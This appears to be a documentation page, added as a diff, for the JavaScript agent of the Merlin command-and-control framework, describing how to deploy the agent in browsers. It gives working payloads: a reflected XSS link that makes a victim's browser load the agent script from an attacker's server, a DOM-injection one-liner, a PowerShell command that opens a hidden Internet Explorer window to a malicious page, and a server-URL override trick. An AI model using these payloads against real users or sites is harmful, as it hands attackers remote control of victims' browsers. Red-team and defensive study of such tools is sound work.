@@ -1,0 +1,379 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html4" lang="en" >
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>JavaScript Agent &mdash; Merlin BETA documentation</title>
+  
+
+  
+  <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+
+  
+  
+  
+  
+
+  
+  <!--[if lt IE 9]>
+    <script src="../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
+        <script type="text/javascript" src="../_static/jquery.js"></script>
+        <script type="text/javascript" src="../_static/underscore.js"></script>
+        <script type="text/javascript" src="../_static/doctools.js"></script>
+        <script type="text/javascript" src="../_static/language_data.js"></script>
+    
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+
+    
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="Main Menu" href="../server/menu/main.html" />
+    <link rel="prev" title="Custom Build" href="custom.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="../index.html" class="icon icon-home" alt="Documentation Home"> Merlin
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                0.8.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Quick Start</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../quickStart/server.html">Merlin Server</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../quickStart/agent.html">Merlin Agent</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../quickStart/faq.html">FAQ</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Merlin Agent</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="cli.html">Command Line Flags</a></li>
+<li class="toctree-l1"><a class="reference internal" href="dll.html">DLL Agent</a></li>
+<li class="toctree-l1"><a class="reference internal" href="powershell.html">PowerShell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="custom.html">Custom Build</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">JavaScript Agent</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#usage">Usage</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#limitations">Limitations</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#javascript-override-variable">JavaScript Override Variable</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#deployment-methods">Deployment Methods</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#cross-site-scripting-xss">Cross-Site Scripting (XSS)</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#inject-into-the-dom">Inject into the DOM</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#windows-ie-com-object">Windows IE COM Object</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#override-url">Override URL</a></li>
+</ul>
+</li>
+</ul>
+<p class="caption"><span class="caption-text">Merlin Server</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/main.html">Main Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/agents.html">Agent Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/listeners.html">Listener Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/menu/modules.html">Modules Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/x509.html">TLS Certificates</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Modules</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../modules/build.html">Building Modules</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Misc.</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../misc/blogs.html">Blog Posts</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/contrib.html">Contributing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/logging.html">Logging</a></li>
+</ul>
+
+            
+          
+        </div>
+        
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">Merlin</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html" class="icon icon-home"></a> &raquo;</li>
+        
+      <li>JavaScript Agent</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/agent/javascript.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="javascript-agent">
+<h1>JavaScript Agent<a class="headerlink" href="#javascript-agent" title="Permalink to this headline">¶</a></h1>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">The JavaScript agent is no longer supported and does not work with newer versions of Merlin</p>
+</div>
+<p>This version of the Merlin Agent is written in JavaScript and can be run
+in any location that can execute JavaScript. Web browsers can be found
+on a multitude of devices to include computers, tablets, phones, TVs,
+cars, and gaming systems. These are good candidates places to run a
+Merlin agent.</p>
+<p>An introductory blog post can be found here:
+<a class="reference external" href="https://medium.com/&#64;Ne0nd0g/merlin-javascript-all-up-in-your-browsers-e46d6449382">https://medium.com/&#64;Ne0nd0g/merlin-javascript-all-up-in-your-browsers-e46d6449382</a></p>
+<a href="https://asciinema.org/a/RHKqctghoo9fCkIVZjyMQV0N7"><img src="https://asciinema.org/a/RHKqctghoo9fCkIVZjyMQV0N7.png" alt="ASCIICast JavaScript Agent"><div class="section" id="usage">
+<h2>Usage<a class="headerlink" href="#usage" title="Permalink to this headline">¶</a></h2>
+<p>The Merlin JavaScript Agent functions the same as other agents. It is
+controlled through the server using the same commands. It is important
+to note that the Merlin JavaScript Agent is only capable of executing
+JavaScript commands. For example, you could execute <code class="docutils literal notranslate"><span class="pre">2</span> <span class="pre">+</span> <span class="pre">2</span></code> and the
+agent will return <code class="docutils literal notranslate"><span class="pre">4</span></code>. Alternatively, you can execute <code class="docutils literal notranslate"><span class="pre">alert('Merlin')</span></code>
+and a JavaScript alert box will appear on the page where the Merlin
+Agent is running.</p>
+</div>
+<div class="section" id="limitations">
+<h2>Limitations<a class="headerlink" href="#limitations" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li>Browser must support HTTP/2</li>
+<li>JavaScript XHR calls will fail if using a self-signed/untrusted TLS certificate</li>
+<li>Your commands are limited to the sandbox environment (unless there is a vulnerability to escape it)</li>
+<li>Web browser must stay in the foreground on mobile devices to keep running</li>
+</ul>
+</div>
+<div class="section" id="javascript-override-variable">
+<h2>JavaScript Override Variable<a class="headerlink" href="#javascript-override-variable" title="Permalink to this headline">¶</a></h2>
+<p>The Merlin Server address is hardcoded into the <cite>url</cite> variable inside
+of the JavaScript file. However, the Merlin JavaScript Agent will check
+for existence of the <cite>oURL</cite> variable prior to executing the main
+function. This variable is used to _override_ the hardcoded <cite>url</cite>
+variable. This is useful when you want to deliver the JavaScript file
+but don’t want to change the <cite>url</cite> parameter prior to delivery. An
+example of practical application is in the <em>Deployment Methods</em> section.</p>
+</div>
+<div class="section" id="deployment-methods">
+<h2>Deployment Methods<a class="headerlink" href="#deployment-methods" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li>Merlin JavaScript Agent Test Page</li>
+<li>Cross-Site Scripting (XSS)</li>
+<li>Inject directly into the DOM</li>
+<li>Windows IE COM Object</li>
+<li>Override oURLJavaScript variable</li>
+</ul>
+<p>### Merlin JavaScript Agent Test Page
+Merlin ships with an HTML page that can be used to test the
+<em>Merlin JavaScript Agent</em>. It can be found at <code class="docutils literal notranslate"><span class="pre">data/html/merlin.html</span></code>.
+This page will automatically load the Merlin JavaScript agent, connect
+to the Merlin Server, and start writing verbose messages to the screen.
+The quickest way to try this out it is to use Python and start a simple
+web server in the <code class="docutils literal notranslate"><span class="pre">html</span></code> directory (i.e.
+<code class="docutils literal notranslate"><span class="pre">cd</span> <span class="pre">data/html;python</span> <span class="pre">-m</span> <span class="pre">SimpleHTTPServer</span></code>) and then browse to page with
+<code class="docutils literal notranslate"><span class="pre">http://127.0.0.1:8000/merlin.html</span></code>.</p>
+</div>
+<div class="section" id="cross-site-scripting-xss">
+<h2>Cross-Site Scripting (XSS)<a class="headerlink" href="#cross-site-scripting-xss" title="Permalink to this headline">¶</a></h2>
+<p>Let’s assume that you’ve found a XSS vulnerability in a GET parameter
+for Acme Widgets. For example the <code class="docutils literal notranslate"><span class="pre">page</span></code> parameter of
+<code class="docutils literal notranslate"><span class="pre">https://www.acme.com/index.html?page=1</span></code> reflects back the value to the
+user. You can exploit this XSS vulnerability to create a link that would
+deliver a Merlin Agent to a victim if they click the link. An example
+of the Merlin payload would be <code class="docutils literal notranslate"><span class="pre">var</span> <span class="pre">merlin=document.createElement('scri</span>
+<span class="pre">pt');merlin.src='http://127.0.0.1:8000/scripts/merlin.js';document.head.appendC</span>
+<span class="pre">hild(merlin);</span></code>.</p>
+<p>An example of the full payload is:</p>
+<p><code class="docutils literal notranslate"><span class="pre">https://www.acme.com/index.html?page=var%20merlin=document.createElement('script');merlin.src='http://127.0.0.1:8000/merlin.js';document.head.appendChild(merlin);</span></code></p>
+</div>
+<div class="section" id="inject-into-the-dom">
+<h2>Inject into the DOM<a class="headerlink" href="#inject-into-the-dom" title="Permalink to this headline">¶</a></h2>
+<p>Most web browser come with developer tools. These tools can be used to
+execute JavaScript commands on <em>any page</em> that you are viewing. On Firefox
+you can hit the <code class="docutils literal notranslate"><span class="pre">F12</span></code> key to open the developer Web Console. From
+there, you can execute this command:</p>
+<p><code class="docutils literal notranslate"><span class="pre">var</span> <span class="pre">merlin=document.createElement('script');merlin.src='http://127.0.0.1:8000/scripts/merlin.js';document.head.appendChild(merlin);</span></code></p>
+</div>
+<div class="section" id="windows-ie-com-object">
+<h2>Windows IE COM Object<a class="headerlink" href="#windows-ie-com-object" title="Permalink to this headline">¶</a></h2>
+<p>Using PowerShell, you can create and hide an Internet Explorer COM
+object. This would create an Internet Explorer window, hide it so that
+the user can’t see it, and then browse to your malicious page. This
+method also has the most obstacles. The newly created window will not
+trust your self-signed certificates, so you must be using a valid TLS
+certificate. <strong>For testing</strong>, you can circumvent this by making the
+windows visible, browsing to the root of your web server, and creating
+an exception in Internet Explorer. After creating the exception, then
+you can navigate the web page to your malicious page and then hide the
+window again. Additionally, Internet Explorer seems to error out if your
+malicious page is not served from the same place as your Merlin Server.
+This caused the hidden Internet Explorer window re-appear (made
+visible) on its own.</p>
+<p>You can use the built-in <em>Merlin JavaScript Agent Test Page</em> to serve
+the payload, but your probably better off creating a page somewhere
+else with minimal HTML. If you decide to serve the <em>Merlin JavaScript
+Agent Test Page</em> to deliver the payload, you can shutdown the server
+giving out the page (not the Merlin Server) right after it is grabbed
+by the client. The malicious HTML page does not need to be available
+after initial delivery. Merlin Server is not currently setup to serve
+the <em>Merlin JavaScript Agent Test Page</em> itself, yet. I will work on
+getting it implemented.</p>
+<p>An example PowerShell command is:</p>
+<p><code class="docutils literal notranslate"><span class="pre">$W=New-Object</span> <span class="pre">-com</span> <span class="pre">'InternetExplorer.Application';$W.visible=$False;$W.navigate('http://www.acmewidgets.com:8000/merlin.html')</span></code></p>
+</div>
+<div class="section" id="override-url">
+<h2>Override URL<a class="headerlink" href="#override-url" title="Permalink to this headline">¶</a></h2>
+<p>You can host the JavaScript in its original form without having to hard
+code your Merlin Server’s URL in the file. Merlin checks the DOM for the
+<code class="docutils literal notranslate"><span class="pre">oURL</span></code> variable and will use its value to connect back with (if it
+exists). This provides flexibility to dynamically change the Merlin
+Server’s URL on the fly.</p>
+<div class="admonition tip">
+<p class="first admonition-title">Tip</p>
+<p class="last">If the place you are hosting the file returns the JavaScript file
+with a content-type of <code class="docutils literal notranslate"><span class="pre">text/plain</span></code>, then the <em>Merlin JavaScript Agent</em>
+will fail to load due to strict MIME type checking. The precludes you
+from calling the file directly from GitHub. However, if no content-type
+is provided, the agent should run.</p>
+</div>
+<p>An example command is: <code class="docutils literal notranslate"><span class="pre">var</span> <span class="pre">oURL='https://your.merlin.server:443/';var</span> <span class="pre">merlin=document.createElement('script');merlin.src='https://some.hosting.provider/merlin.js';document.head.appendChild(merlin);</span></code></p>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="../server/menu/main.html" class="btn btn-neutral float-right" title="Main Menu" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="custom.html" class="btn btn-neutral float-left" title="Custom Build" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        
+        &copy; Copyright 2020, Russel Van Tuyl (@Ne0nd0g)
+
+    </p>
+  </div>
+    
+    
+    
+    Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a
+    
+    <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a>
+    
+    provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
